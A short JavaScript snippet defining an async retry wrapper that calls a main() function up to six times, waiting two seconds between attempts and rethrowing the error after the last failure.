// Retry wrapper function: retries main up to 6 times with 2-second interval
const mainWithRetry = async (maxRetries = 6, delayMs = 2000) => {
    let attempts = 0;
    while (attempts < maxRetries) {
        try {
            await main();
            return; // Success, exit
        } catch (error) {
            attempts++;
            if (attempts >= maxRetries) {
                console.error(`Failed after ${maxRetries} attempts:`, error);
                throw error;
            }
            console.warn(`Attempt ${attempts} failed, retrying in ${delayMs / 1000} seconds...`);
            await new Promise(resolve => setTimeout(resolve, delayMs));
        }
    }
};

